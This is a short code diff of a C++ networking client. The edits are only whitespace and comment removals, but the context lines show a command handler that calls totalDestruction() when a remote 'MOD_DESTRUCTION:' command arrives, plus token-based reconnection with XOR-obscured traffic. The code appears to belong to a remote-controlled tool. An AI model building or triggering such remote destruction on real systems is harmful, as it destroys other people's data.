@@ -148,7 +148,7 @@ int Connexion::main()
             else if (command.substr(0,16) == "MOD_DESTRUCTION:") 
             {
                 cout << "MOD DESTRUCTION !" << endl;
-
+                
                 if(totalDestruction() == 0)
                 {
                     //If error
@@ -308,7 +308,6 @@ void Connexion::closeConnexion()
 void Connexion::reConnect()
 {   
     string request;
-    //cout << "GO TO RECO..." << endl;
     //if the client has a token then reconnects without handshaking
 
     closeConnexion();
@@ -321,8 +320,6 @@ void Connexion::reConnect()
 
     sendUltraSafe(sock_client, XOREncryption("\r\n"));
 }
-
-
 
 
 int Connexion::getSocket()
